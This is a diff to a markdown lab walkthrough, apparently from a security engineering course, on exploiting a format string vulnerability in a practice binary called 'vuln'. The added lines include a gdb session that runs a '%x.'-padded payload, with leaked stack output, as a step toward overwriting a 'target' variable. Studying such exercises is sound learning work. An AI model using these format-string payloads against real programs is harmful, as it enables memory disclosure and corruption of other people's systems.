@@ -85,12 +85,19 @@ Try with adding extra padding (BB):
 
    Note: I just rerun that and my working command looked like this:
 ```
-   run `(python -c 'print "AAAA"+"BB" + "%x." * 143+"%x"')` and the distance calculation was 141 so I guess its always slightly different
+   run `(python -c 'print "AAAA"+"BB" + "%x." * 143+"%x"')`
 ```
+ and the distance calculation was 141 so I guess it is always slightly different but close enough
+
 ![image](https://github.com/osuzuki/sec_engineering_exercises/assets/8805399/ef7206d2-c61b-4c37-b1ac-513b8251635c)
 
    
-My pointer is now pointing to the hexadecimal representation of 'AAAA' exactly
+My pointer is now pointing to the hexadecimal representation of 'AAAA' exactly 
+```
+(gdb)      run `(python -c 'print "AAAA"+"BB" + "%x." * 143+"%x"')`
+Starting program: /home/olg4/learning/week22/vuln `(python -c 'print "AAAA"+"BB" + "%x." * 143+"%x"')`
+AAAABB4020e000.0.4006920b.4020e3fc.0.bffff378.80484e7.bffff580.bffff424.bffff430.8048521.4000f9d0.bffff390.0.40051e91.4020e000.4020e000.0.40051e91.2.bffff424.bffff430.bffff3b4.1.0.4020e000.4000f77a.40027000.0.4020e000.0.0.851c2a68.70c7ad97.0.0.0.2.8048370.0.40014dc0.4000f9d0.804a000.2.8048370.0.80483a2.80484c3.2.bffff424.8048500.8048560.4000f9d0.bffff41c.40027940.2.bffff560.bffff580.0.bffff736.bffff749.bffffd35.bffffd69.bffffd8b.bffffd9a.bffffda7.bffffdc2.bffffe0d.bffffe20.bffffe2a.bffffe49.bffffe52.bffffe62.bffffe84.bffffec5.bffffed8.bffffee4.bffffef8.bfffff0c.bfffff1c.bfffff24.bfffff31.bfffff50.bfffffb8.0.20.4002bb50.21.4002b000.10.1f8bfbff.6.1000.11.64.3.8048034.4.20.5.9.7.40000000.8.0.9.8048370.b.81c.c.81c.d.7d0.e.7d0.17.0.19.bffff54b.1a.0.1f.bfffffd8.f.bffff55b.0.0.0.0.d000000.859f2e13.458bbd7d.1365d6c3.69e5b851.363836.6d6f682f.6c6f2f65.6c2f3467.6e726165.2f676e69.6b656577.762f3232.6e6c75.41414141
+```
 
 12. Replace AAAA with the address of the 'target' variable 
     To find the target variable type: '''p &target '''
